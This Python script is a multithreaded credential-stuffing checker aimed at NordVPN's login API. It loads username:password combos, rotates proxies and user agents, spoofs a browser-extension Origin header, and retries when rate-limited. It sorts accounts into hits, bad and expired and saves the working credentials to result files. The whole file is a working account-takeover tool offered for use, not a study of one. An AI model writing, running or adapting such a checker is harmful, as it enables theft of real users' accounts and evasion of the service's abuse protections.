import json
from helpers import _clear,_setTitle,_printText,_readFile,_getCurrentTime,_getRandomUserAgent,_getRandomProxy,colors
from threading import Thread,active_count, current_thread
from time import sleep
from datetime import datetime
import requests

class Main:
    def __init__(self) -> None:
        _setTitle('[NordVPN]')
        _clear()
        title = colors['bcyan']+"""
                          ╔═════════════════════════════════════════════════════════════════════════╗
                            $$\   $$\                           $$\ $$\    $$\ $$$$$$$\  $$\   $$\ 
                            $$$\  $$ |                          $$ |$$ |   $$ |$$  __$$\ $$$\  $$ |
                            $$$$\ $$ | $$$$$$\   $$$$$$\   $$$$$$$ |$$ |   $$ |$$ |  $$ |$$$$\ $$ |
                            $$ $$\$$ |$$  __$$\ $$  __$$\ $$  __$$ |\$$\  $$  |$$$$$$$  |$$ $$\$$ |
                            $$ \$$$$ |$$ /  $$ |$$ |  \__|$$ /  $$ | \$$\$$  / $$  ____/ $$ \$$$$ |
                            $$ |\$$$ |$$ |  $$ |$$ |      $$ |  $$ |  \$$$  /  $$ |      $$ |\$$$ |
                            $$ | \$$ |\$$$$$$  |$$ |      \$$$$$$$ |   \$  /   $$ |      $$ | \$$ |
                            \__|  \__| \______/ \__|       \_______|    \_/    \__|      \__|  \__|
                          ╚═════════════════════════════════════════════════════════════════════════╝
        """
        print(title)
        self.stop_thread = False

        self.hit = 0
        self.bad = 0
        self.expired = 0
        self.retries = 0

        self.use_proxy = int(input(f'{colors["bcyan"]}[>] {colors["yellow"]}[1]Proxy/[2]Proxyless:{colors["bcyan"]} '))
        self.proxy_type = None

        if self.use_proxy == 1:
            self.proxy_type = int(input(f'{colors["bcyan"]}[>] {colors["yellow"]}[1]Https/[2]Socks4/[3]Socks5:{colors["bcyan"]} '))

        self.threads = int(input(f'{colors["bcyan"]}[>] {colors["yellow"]}Threads:{colors["bcyan"]} '))
        self.session = requests.session()
        print('')

    def _titleUpdate(self):
        while True:
            _setTitle(f'[NordVPN] ^| HITS: {self.hit} ^| BAD: {self.bad} ^| EXPIRED: {self.expired} ^| RETRIES: {self.retries}')
            sleep(0.4)
            if self.stop_thread == True:
                break

    def _check(self,user,password):
        useragent = _getRandomUserAgent('useragents.txt')
        headers = {'User-Agent':useragent,'Content-Type':'application/json','Host':'api.nordvpn.com','Accept':'application/json','DNT':'1','Origin':'chrome-extension://fjoaledfpmneenckfbpdfhkmimnjocfa'}
        proxy = _getRandomProxy(self.use_proxy,self.proxy_type,'proxies.txt')
        payload = {'username':user,'password':password}
        try:
            response = self.session.post('https://api.nordvpn.com/v1/users/tokens',json=payload,proxies=proxy,headers=headers)

            if "'code': 100103" in response.text:
                self.bad += 1
                _printText(colors['bcyan'],colors['red'],'BAD',f'{user}:{password}')
                with open('[Results]/bads.txt','a',encoding='utf8') as f:
                    f.write(f'{user}:{password}\n')
            elif "'code': 101301" in response.text:
                self.bad += 1
                _printText(colors['bcyan'],colors['red'],'BAD',f'{user}:{password}')
                with open('[Results]/bads.txt','a',encoding='utf8') as f:
                    f.write(f'{user}:{password}\n')
            elif 'user_id' in response.text:
                expires_at = response.json()['expires_at']
                expires_at = datetime.strptime(expires_at,"%Y-%m-%d %H:%M:%S")
                curr_time = datetime.strptime(_getCurrentTime(),"%Y-%m-%d %H:%M:%S")
                if expires_at < curr_time:
                    self.expired += 1
                    _printText(colors['bcyan'],colors['red'],'EXPIRED',f'{user}:{password} [{expires_at}]')
                    with open('[Results]/expireds.txt','a',encoding='utf8') as f:
                        f.write(f'{user}:{password} [{str(expires_at)}\n')
                else:
                    self.hit += 1
                    _printText(colors['bcyan'],colors['green'],'HIT',f'{user}:{password} [{expires_at}]')
                    with open('[Results]/hits.txt','a',encoding='utf8') as f:
                        f.write(f'{user}:{password}\n')
                    with open('[Results]/detailed_hits.txt','a',encoding='utf8') as f:
                        f.write(f'{user}:{password} [{str(expires_at)}]\n')
            elif '429 Too Many Requests' in response.text:
                self.retries += 1
                self._check(user,password)
            else:
                self.retries += 1
                self._check(user,password)
        except Exception:
            self.retries += 1
            self._check(user,password)

    def _start(self):
        combos = _readFile('combos.txt','r')
        t = Thread(target=self._titleUpdate)
        t.start()
        threads = []
        for combo in combos:
            run = True
            
            user = combo.split(':')[0]
            password = combo.split(':')[1]

            while run:
                if active_count()<=self.threads:
                    thread = Thread(target=self._check,args=(user,password))
                    threads.append(thread)
                    thread.start()
                    run = False

        for x in threads:
            x.join()

        print('')
        _printText(colors['bcyan'],colors['yellow'],'FINISHED','Process done!')

if __name__ == '__main__':
    Main()._start()